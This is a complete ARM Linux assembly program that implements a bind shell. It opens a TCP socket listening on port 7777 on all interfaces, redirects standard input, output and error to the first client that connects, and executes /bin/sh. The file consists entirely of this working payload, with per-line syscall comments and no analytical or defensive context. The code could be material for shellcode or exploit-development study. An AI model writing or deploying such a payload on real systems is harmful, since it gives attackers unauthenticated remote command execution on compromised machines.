.text
.global _start

_start:
    mov r0, #2		// AF_INET domain
    mov r1, #1		// SOCK_STREAM type
    mov r2, #0		// TCP protocol
    mov r7, #200	// two ops to load syscall number
    add r7, #81		// 281 is socket
    svc #0

    mov r4, r0		// save server socket

    mov r0, r4		// socket fd
    adr r1, _sa		// pointer to sa struct
    mov r2, #16		// sizeof sa struct
    mov r7, #200	// two ops to load syscall number
    add r7, #82		// 282 is bind
    svc #0

    mov r0, r4		// socket fd
    mov r1, #0		// backlog 0
    mov r7, #200	// two ops to load syscall number
    add r7, #84		// 284 is listen
    svc #0

    mov r0, r4		// socket fd
    mov r1, #0		// NULL addr
    mov r2, #0		// addrlen zero
    mov r7, #200	// two ops to load syscall number
    add r7, #85		// 285 is accept
    svc #0

    mov r4, r0		// save client socket

    mov r0, r4		// socket fd
    mov r1, #0		// stdin
    mov r7, #63		// dup2
    svc #0

    mov r0, r4		// socket fd
    mov r1, #1		// stdout
    mov r7, #63		// dup2
    svc #0

    mov r0, r4		// socket fd
    mov r1, #2		// stderr
    mov r7, #63		// dup2
    svc #0

    adr r0, _shell	// exec arg /bin/sh
    mov r1, #0		// null argv
    mov r2, #0		// null env
    mov r7, #11		// exec
    svc #0

// sa struct
// 0x611e is 7777 little-endian, 0x0002 is AF_INET
// INADDR_ANY
_sa:
.word 0x611e0002
.word 0x00000000
.word 0x00000000
.word 0x00000000

_shell:
.asciz "/bin/sh"	// NULL terminated
